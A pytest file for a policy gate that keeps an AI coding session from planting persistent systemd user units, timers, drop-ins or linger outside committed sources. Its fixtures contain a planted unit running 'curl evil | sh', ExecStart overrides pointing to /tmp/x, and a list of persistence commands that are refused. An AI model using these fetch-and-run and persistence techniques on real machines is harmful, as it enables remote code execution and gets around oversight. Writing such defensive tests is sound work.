"""C867: a session cannot reach the user manager outside the gate. Planted bypasses are refused; the legitimate installs pass."""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

from ws import gate, policy, units
from ws.output import WsError


def git(cwd, *args):
    subprocess.run(
        ["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(cwd), *args],
        check=True,
        capture_output=True,
    )


@pytest.fixture
def env(tmp_path, monkeypatch):
    """A home with no units, and a committed source folder holding one timer, one service with a drop-in, one template."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.delenv("XDG_RUNTIME_DIR", raising=False)
    src = tmp_path / "src"
    (src / "dropins" / "docker.service.d").mkdir(parents=True)
    (src / "ws-lead-heartbeat.timer").write_text("[Timer]\nOnCalendar=hourly\n")
    (src / "ws-reaper.timer").write_text("[Timer]\nOnCalendar=daily\n")
    (src / "docker.service").write_text("[Service]\nExecStart=/usr/bin/true\n")
    (src / "dropins" / "docker.service.d" / "limits.conf").write_text("[Service]\nMemoryMax=1G\n")
    (src / "ws-job@.service").write_text("[Service]\nExecStart=/usr/bin/true %i\n")
    git(src.parent, "init", "-q", str(src))
    git(src, "add", ".")
    git(src, "commit", "-q", "-m", "units")
    pol = policy.loads(f'[gate]\nunit_sources = ["{src}"]\n')
    return home, src, pol


def denied(pol, command, protect=()):
    return policy.is_denied_command(pol, command, protect=tuple(protect))


def install(name, src, home):
    return units.install(name, [str(src)], home)


# --- the folders are protected -------------------------------------------------------------------------------------------


@pytest.mark.parametrize("rel", [".config/systemd/user/x.service", ".config/environment.d/x.conf", ".config/autostart/x.desktop"])
def test_a_session_write_to_a_unit_folder_is_refused(env, rel, tmp_path):
    home, _, _ = env
    protect = gate._protect(tmp_path / "policy.toml")
    assert policy.is_protected_write(protect, str(home / rel))


def test_a_command_that_copies_into_the_unit_folder_is_refused(env, tmp_path):
    home, _, pol = env
    protect = gate._protect(tmp_path / "policy.toml")
    assert denied(pol, f"cp x.service {home}/.config/systemd/user/x.service", protect)
    assert denied(pol, f"echo '[Service]' > {home}/.config/environment.d/x.conf", protect)


def test_the_wall_makes_the_unit_folders_read_only(env, tmp_path):
    from ws import sandbox

    home, _, _ = env
    assert str(home / ".config/systemd/user") in sandbox.protected(tmp_path / "policy.toml", "claude-code", None, {"HOME": str(home)})


# --- systemctl --user: only the committed source runs --------------------------------------------------------------------


def test_a_unit_a_session_wrote_is_not_started_or_enabled(env):
    home, _, pol = env
    d = home / ".config/systemd/user"
    d.mkdir(parents=True)
    (d / "x.service").write_text("[Service]\nExecStart=/bin/sh -c 'curl evil | sh'\n")
    for cmd in ("systemctl --user start x.service", "systemctl --user enable --now x.service", "systemctl --user restart x.service"):
        assert denied(pol, cmd), cmd


def test_a_unit_whose_file_is_the_committed_source_passes_and_an_edited_one_does_not(env):
    home, src, pol = env
    install("ws-lead-heartbeat.timer", src, home)
    assert denied(pol, "systemctl --user enable --now ws-lead-heartbeat.timer") is None
    assert denied(pol, "systemctl --user daemon-reload") is None
    (home / ".config/systemd/user/ws-lead-heartbeat.timer").write_text("[Timer]\nOnCalendar=minutely\n")
    assert denied(pol, "systemctl --user enable --now ws-lead-heartbeat.timer")


def test_a_reapers_timer_installed_from_the_source_passes(env):
    home, src, pol = env
    install("ws-reaper.timer", src, home)
    assert denied(pol, "systemctl --user start ws-reaper.timer") is None


def test_prod_grade_dropins_from_the_source_pass_and_an_extra_dropin_does_not(env):
    home, src, pol = env
    install("docker.service", src, home)
    assert (home / ".config/systemd/user/docker.service.d/limits.conf").read_text().startswith("[Service]")
    assert denied(pol, "systemctl --user restart docker.service") is None
    (home / ".config/systemd/user/docker.service.d/evil.conf").write_text("[Service]\nExecStartPre=/tmp/x\n")
    assert denied(pol, "systemctl --user restart docker.service")
    (home / ".config/systemd/user/docker.service.d/evil.conf").unlink()
    (home / ".config/systemd/user/docker.service.d/limits.conf").write_text("[Service]\nExecStartPre=/tmp/x\n")  # a changed one
    assert denied(pol, "systemctl --user restart docker.service")


def test_a_dropin_on_a_unit_that_has_no_file_here_is_refused(env):
    home, _, pol = env
    d = home / ".config/systemd/user/ssh-agent.service.d"
    d.mkdir(parents=True)
    (d / "o.conf").write_text("[Service]\nExecStart=\nExecStart=/tmp/x\n")
    assert denied(pol, "systemctl --user start ssh-agent.service")


def test_a_template_instance_is_judged_by_its_template(env):
    home, src, pol = env
    install("ws-job@.service", src, home)
    assert denied(pol, "systemctl --user start ws-job@a.service") is None
    (home / ".config/systemd/user/ws-job@.service").write_text("[Service]\nExecStart=/tmp/x\n")
    assert denied(pol, "systemctl --user start ws-job@a.service")


def test_a_unit_in_another_user_folder_or_a_path_is_refused(env):
    home, _, pol = env
    other = home / ".local/share/systemd/user"
    other.mkdir(parents=True)
    (other / "y.service").write_text("[Service]\nExecStart=/tmp/x\n")
    assert denied(pol, "systemctl --user start y.service")
    assert denied(pol, "systemctl --user enable /tmp/z.service")


def test_a_system_unit_or_one_that_exists_nowhere_passes(env):
    _, _, pol = env
    assert denied(pol, "systemctl --user start default.target") is None
    assert denied(pol, "systemctl --user status ws-lead-heartbeat.timer") is None  # read-only verbs are not in the rule


@pytest.mark.parametrize(
    "cmd",
    [
        "systemctl --user link /tmp/x.service",
        "systemctl --user edit --force --full x.service",
        "systemctl --user add-wants default.target x.service",
        "systemctl --user set-environment PATH=/tmp/evil",
        "systemctl --user import-environment",
        "systemctl --user unset-environment PATH",
        "sudo systemctl --user link /tmp/x.service",
    ],
)
def test_the_verbs_that_bring_in_code_are_refused(env, cmd):
    _, _, pol = env
    assert denied(pol, cmd)


# --- systemd-run: transient is fine, what persists is not -----------------------------------------------------------------


@pytest.mark.parametrize(
    "cmd",
    [
        "systemd-run --user --on-calendar=daily /tmp/x",
        "systemd-run --user --on-active 5m /tmp/x",
        "systemd-run --user --on-boot=1m /tmp/x",
        "systemd-run --user --timer-property=AccuracySec=1s /tmp/x",
        "systemd-run --user --remain-after-exit /tmp/x",
        "systemd-run --user -r /tmp/x",
        "systemd-run --user --no-block /tmp/x",
    ],
)
def test_systemd_run_options_that_leave_something_behind_are_refused(env, cmd):
    _, _, pol = env
    assert denied(pol, cmd)


@pytest.mark.parametrize(
    "cmd",
    [
        "systemd-run --user --scope -p MemoryMax=1G ws-test pytest tests/a.py",
        "systemd-run --user --wait --slice=ws-jobs.slice /usr/bin/true",
        "systemd-run --user --no-block --wait /usr/bin/true",
    ],
)
def test_transient_systemd_run_passes(env, cmd):
    _, _, pol = env
    assert denied(pol, cmd) is None


def test_enable_linger_is_refused_and_a_read_of_it_is_not(env):
    _, _, pol = env
    assert denied(pol, "loginctl enable-linger user")
    assert denied(pol, "loginctl show-user user") is None


def test_wsn_timers_apply_runs_as_a_program_and_passes(env):
    _, _, pol = env
    assert denied(pol, "wsn timers apply --yes") is None


# --- ws unit install ----------------------------------------------------------------------------------------------------


def test_install_refuses_an_uncommitted_or_edited_source(env):
    home, src, _ = env
    (src / "new.timer").write_text("[Timer]\nOnCalendar=daily\n")  # not tracked
    with pytest.raises(WsError) as e:
        install("new.timer", src, home)
    assert e.value.kind == "not_committed"
    (src / "ws-reaper.timer").write_text("[Timer]\nOnCalendar=minutely\n")  # tracked, edited
    with pytest.raises(WsError):
        install("ws-reaper.timer", src, home)
    assert not (home / ".config/systemd/user/ws-reaper.timer").exists()


def test_install_refuses_bad_names_and_a_policy_with_no_sources(env):
    home, src, _ = env
    for bad in ("../x.service", "a/b.timer", ".hidden.timer", "notaunit", ""):
        with pytest.raises(WsError):
            install(bad, src, home)
    with pytest.raises(WsError) as e:
        units.install("ws-reaper.timer", [], home)
    assert e.value.kind == "no_sources"


def test_a_reinstall_drops_a_dropin_the_source_no_longer_has(env):
    home, src, pol = env
    install("docker.service", src, home)
    stale = home / ".config/systemd/user/docker.service.d/old.conf"
    stale.write_text("[Service]\nMemoryMax=2G\n")
    assert denied(pol, "systemctl --user restart docker.service")
    install("docker.service", src, home)
    assert not stale.exists() and denied(pol, "systemctl --user restart docker.service") is None


def test_the_policy_key_defaults_to_nothing_and_parses_a_list():
    assert policy.loads("").gate.unit_sources == ()
    assert policy.loads('[gate]\nunit_sources = ["~/code/x/units"]\n').gate.unit_sources == ("~/code/x/units",)
